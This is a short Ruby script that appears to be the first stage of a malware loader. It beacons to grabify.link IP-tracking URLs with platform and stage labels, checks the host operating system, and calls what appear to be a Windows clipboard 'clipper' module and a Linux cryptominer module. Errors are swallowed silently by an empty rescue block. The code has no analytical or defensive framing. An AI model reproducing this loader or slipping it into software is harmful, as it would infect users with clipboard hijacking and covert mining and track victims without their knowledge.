require_relative 'windows'
require_relative 'linux'
require 'open-uri'
require 'net/http'
require 'uri'
require 'resolv'
Version = 1
begin
	html = open('https://grabify.link/VI9H2D', 'User-Agent' => "#{RUBY_PLATFORM}-Stage-One-#{Version}").read
	os = RbConfig::CONFIG['host_os']
	if os.match(/mswin|msys|mingw|cygwin|bccwin|wince|emc/)
		Windows.clipper
		html = open('https://grabify.link/90A2ZI', 'User-Agent' => "#{RUBY_PLATFORM}-Stage-Two-Windows-#{Version}").read
	elsif os.match("linux")
		output, status = Open3.capture2("uname -a ")
		if output.include?("64")
			Linux.miner
			html = open('https://grabify.link/4ZRRUX', 'User-Agent' => "#{RUBY_PLATFORM}-Stage-Three-Linux-#{Version}").read
		end
	end
rescue 
end